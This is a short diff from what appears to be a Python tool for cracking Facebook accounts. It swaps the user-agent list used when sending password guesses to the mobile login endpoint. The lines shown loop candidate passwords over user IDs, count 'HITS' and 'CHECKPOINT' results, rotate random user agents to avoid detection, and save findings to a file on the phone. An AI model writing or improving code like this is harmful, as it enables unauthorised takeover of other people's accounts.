@@ -309,7 +309,7 @@ def xcokis():
     gxdslogo()
     url = "https://n.facebook.com"
     xurl = url + "/login.php"
-    ua = random.choice(gxdsUArndm)
+    ua = random.choice(ugen)
     print(f"{lg}  [•] FILE SAVE IN:{dg} /sdcard/gxds.txt")
     lxnes()
     try:
@@ -442,12 +442,12 @@ def gxdsFilesMenu(gxdsfiles):
 
 # API
 def gxds_files(uid, pxss):
-    global oks, loop, cps, xprox
+    global oks, loop, cps, ugen
     sys.stdout.write( f"\r{dg}  [CHECKED] {loop} | [HITS] {str(len(oks))} | [CHECKPOINT] {str(len(cps))} "), sys.stdout.flush()
     #session = requests.Session()
     try:
         for ps in pxss:
-            qwerty = random.choice(gxdsUArndm)
+            qwerty = random.choice(ugen)
             #gxdsfbs = session.get("https://mbasic.facebook.com").text
             data = {
             "adid": str(uuid.uuid4()),
